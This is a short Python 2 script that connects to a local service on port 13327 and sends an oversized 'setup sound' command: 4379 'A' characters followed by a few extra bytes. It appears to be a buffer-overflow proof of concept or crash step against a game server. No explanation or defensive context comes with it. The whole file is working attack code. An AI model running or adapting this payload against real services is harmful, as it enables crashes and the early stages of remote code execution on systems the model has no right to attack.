#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 13327))

buffer = '\x11(setup sound '
buffer += 'A' *4379
buffer += '\x90\x00#'

s.send(buffer)
data = s.recv(1024)
print data

s.close()
